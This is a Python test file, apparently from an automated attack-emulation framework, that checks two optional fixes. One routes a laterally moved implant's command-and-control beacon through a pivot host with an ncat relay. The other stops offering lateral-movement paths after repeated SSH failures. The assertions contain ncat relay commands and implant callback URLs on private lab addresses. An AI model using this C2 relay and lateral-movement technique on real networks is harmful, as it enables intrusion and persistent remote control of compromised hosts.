"""Execution fixes, each behind its own default-off flag (safely removable):
  FIX #1 c2_pivot_relay   — pivoted implant beacons via the pivot (reachability).
  FIX #3 p3_lateral_verify — stop offering a lateral edge after repeated failures.
Deterministic, no LLM / no C2 / no Docker.
"""

from incalmo.proposal.fixtures.loader import load_fixture
from incalmo.core.actions.LowLevel import SSHLateralMove
from incalmo.core.actions.HighLevel.lateral_move_to_host import _pivot_ip_for, _parse_c2
from incalmo.models.agent import Agent


def _pivot_agent() -> Agent:
    return Agent(
        paw="web", username="root", privilege="Elevated", pid=1,
        host_ip_addrs=["192.168.200.20", "192.168.201.20"], hostname="web",
    )


# ---- FIX #1: C2 pivot relay --------------------------------------------------

def test_relay_off_is_direct_beacon_unchanged():
    cmd = SSHLateralMove(_pivot_agent(), "database").command
    assert "ncat -lk" not in cmd          # no relay started
    assert "-server http" in cmd          # implant beacons directly (baseline)


def test_relay_on_routes_implant_through_pivot():
    relay = {"listen_ip": "192.168.201.20", "port": 8889,
             "c2_host": "192.168.200.10", "c2_port": "8888"}
    cmd = SSHLateralMove(_pivot_agent(), "database", relay=relay).command
    assert "ncat -lk 192.168.201.20 8889" in cmd          # forwarder on the pivot
    assert "ncat 192.168.200.10 8888" in cmd              # ...to the real C2
    assert "-server http://192.168.201.20:8889" in cmd    # implant -> pivot relay


class _HostStub:
    def __init__(self, ips):
        self.ip_addresses = ips


def test_pivot_ip_picks_the_target_subnet_address():
    pivot = _HostStub(["192.168.200.20", "192.168.201.20"])  # dual-homed pivot host
    assert _pivot_ip_for(pivot, "192.168.201.100") == "192.168.201.20"
    assert _pivot_ip_for(pivot, "10.9.9.9") is None   # no shared subnet


def test_parse_c2_splits_host_and_port():
    assert _parse_c2("http://192.168.200.10:8888") == ("192.168.200.10", "8888")
    assert _parse_c2("http://10.0.0.1") == ("10.0.0.1", "8888")


# ---- FIX #3: lateral verify / retry guard -----------------------------------

def _web_db(env):
    return (env.network.find_host_by_ip("192.168.200.20"),
            env.network.find_host_by_ip("192.168.201.100"))


def test_verify_withholds_edge_after_threshold_failures():
    env, ag = load_fixture("p2_reachable")
    web, db = _web_db(env)
    assert len(ag.get_possible_attack_paths(web, db)) > 0   # offered initially
    ag.lateral_verify = True
    ag.lateral_fail_threshold = 2
    ag.record_failed_lateral(web, db)
    assert len(ag.get_possible_attack_paths(web, db)) > 0   # 1 < threshold, still offered
    ag.record_failed_lateral(web, db)
    assert ag.get_possible_attack_paths(web, db) == []      # 2 >= threshold, withheld


def test_verify_off_ignores_failures():
    env, ag = load_fixture("p2_reachable")
    web, db = _web_db(env)
    ag.record_failed_lateral(web, db)
    ag.record_failed_lateral(web, db)
    ag.record_failed_lateral(web, db)
    # lateral_verify defaults off => failures do not gate the edge (baseline)
    assert len(ag.get_possible_attack_paths(web, db)) > 0
